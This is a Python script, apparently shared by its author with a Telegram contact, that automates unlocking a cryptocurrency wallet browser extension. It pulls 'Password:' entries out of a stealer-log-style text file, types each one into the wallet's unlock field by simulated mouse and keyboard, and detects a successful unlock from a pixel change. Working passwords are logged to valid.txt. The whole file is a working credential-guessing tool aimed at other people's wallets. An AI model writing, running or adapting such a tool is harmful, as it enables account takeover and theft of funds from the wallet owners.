import pyautogui as pya
from pynput import mouse
from colorama import Fore, Style, init
import os.path
import keyboard as kb
import re
import time

init(convert=True)

pos1, pos2, entered, pix = [], [], 0, ''

def get_pos(x, y, btn, pressed):
    global pos1
    global pos2
    global entered
    global pix

    if len(pos1) == 0 and entered == 0: 
        pos1 = [x, y]
        entered = 1
    if len(pos2) == 0 and entered == 0:
        pos2 = [x, y]
        pix = pya.pixel(x, y)
        entered = 1

print(f'''
{Fore.RED}  ░█████╗░██╗░░██╗███████╗██╗░░██╗███████╗██████╗░
  ██╔══██╗██║░░██║██╔════╝██║░██╔╝██╔════╝██╔══██╗
  ██║░░╚═╝███████║█████╗░░█████═╝░█████╗░░██████╔╝
  ██║░░██╗██╔══██║██╔══╝░░██╔═██╗░██╔══╝░░██╔══██╗
  ╚█████╔╝██║░░██║███████╗██║░╚██╗███████╗██║░░██║
  ░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝{Style.RESET_ALL}
                    {Fore.GREEN}by Knafi {Style.RESET_ALL}
                    {Fore.GREEN}Telegram: https://t.me/lookupinfo {Style.RESET_ALL}

                    
                    ''')

file_name = input('Переместите файл в папку со скриптом, напишите сюда его название и нажмите Enter:::')

listener = mouse.Listener(
    on_click = get_pos
)
listener.start()

input('Наведите курсор на поле ввода и кликните левой кнопкой, после нажмите Enter:::')
print(f'[+] Координаты поля: {pos1[0], pos1[1]}')

entered = 0

input('Наведите курсор на поле кнопку ввода и кликните левой кнопкой, после нажмите Enter:::')
print(f'[+] Координаты кнопки: {pos2[0], pos2[1], pix}')

listener.stop()

valid_file = os.path.isfile('valid.txt')
if valid_file is False: 
    with open("valid.txt", "w", encoding="utf-8") as v:
        v.write("""
  ░█████╗░██╗░░██╗███████╗██╗░░██╗███████╗██████╗░
  ██╔══██╗██║░░██║██╔════╝██║░██╔╝██╔════╝██╔══██╗
  ██║░░╚═╝███████║█████╗░░█████═╝░█████╗░░██████╔╝
  ██║░░██╗██╔══██║██╔══╝░░██╔═██╗░██╔══╝░░██╔══██╗
  ╚█████╔╝██║░░██║███████╗██║░╚██╗███████╗██║░░██║
  ░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                    by Knafi 
                    Telegram: https://t.me/lookupinfo
        """)

print('[=============]')
print('[+] У вас есть 5 секунд, что бы открыть расширение и сменить язык на английский')
time.sleep(5)
print('[+] Начинаю чтение файла')

if len(file_name) > 0:
    file_name = file_name.split('.')[0]
    print(f'[+] Название целевого файла: {file_name}')

    try:
         with open(f"{file_name}.txt", "r+") as f:
            parsed = f.read()
            pattern = r"={3,}|\n"
            if len(parsed)>0:
                arr = []
                result = re.split(pattern, parsed)
                for x in result:
                    if(x.strip().startswith('Password')):
                        arr.append(x.split(':', 1)[1].strip())

                if len(arr) > 0: 
                    if len(pos1) == 2 and len(pos2) == 2:
                        for x in arr: 
                            print(f'[+] Ввожу значение {x}')
                            pya.moveTo(pos1[0], pos1[1])
                            pya.click()
                            kb.write(x)
                            pya.moveTo(pos2[0], pos2[1])
                            pya.click()
                            pya.moveTo(pos1[0], pos1[1])
                            pya.click()
                            time.sleep(.5)
                            is_pix = pya.pixel(pos2[0], pos2[1])
                            if is_pix[0] != pix[0] or is_pix[1] != pix[1] or is_pix[2] != pix[2]: 
                                print(f'{Fore.GREEN}[+] Valid. Пароль {x} валиден{Style.RESET_ALL}')
                                print(f'{Fore.YELLOW}[+] Записываю валид в файл{Style.RESET_ALL}')
                                try:
                                    with open ('valid.txt', 'a') as v:
                                        v.write(f'\n[+] Valid: {x}')
                                        print(f'{Fore.GREEN}[+] Изменения успешно записаны в файл{Style.RESET_ALL}')
                                except:
                                    print(f'{Fore.RED}[-] Ошибка при записи файла{Style.RESET_ALL}')
                                print(f'{Fore.RED}У вас есть 5 секунд, что бы закрыть кошелек.{Style.RESET_ALL}')
                                time.sleep(5)
                            else:
                                kb.press('ctrl+a')
                                kb.release('ctrl+a')
                                kb.press('backspace')
                                print('[+] Кнопка нажата. Перезапуск цикла')
                else:
                    print(f'{Fore.RED}[-] Произошла ошибка. Не удалось извлечь значения.{Style.RESET_ALL}')
                #print(arr) 
            else:
                print('{Fore.RED}[-] Файл пуст{Style.RESET_ALL}')
    except FileNotFoundError:
        print(f'{Fore.RED}[-] Файл {file_name} не найден{Style.RESET_ALL}')
    #except:
    #   print('[-] Произошла ошибка')
